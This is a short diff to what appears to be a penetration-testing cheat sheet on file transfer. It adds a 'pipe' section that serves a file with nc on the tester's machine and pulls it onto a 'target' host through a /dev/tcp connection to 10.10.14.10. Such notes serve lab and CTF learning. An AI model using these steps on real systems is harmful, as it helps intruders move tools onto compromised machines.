@@ -72,6 +72,34 @@ scp -i id_rsa /tmp/local/file user@10.10.11.10:/tmp/remote/file
 
 ---
 
+### pipe
+
+#### Local to Remote
+
+```bash
+# In our local Linux machine
+cat filename | nc -lnvp 4444
+```
+
+```bash
+# In target Linux machine
+exec 3<>/dev/tcp/10.10.14.10/4444
+```
+
+```bash
+# Ctrl+C to interrupt after some time
+cat <&3 > filename
+```
+
+```bash
+# Check
+md5sum filename
+```
+
+<br>
+
+---
+
 ### Base64 Encoding (for small binary)
 
 ```bash
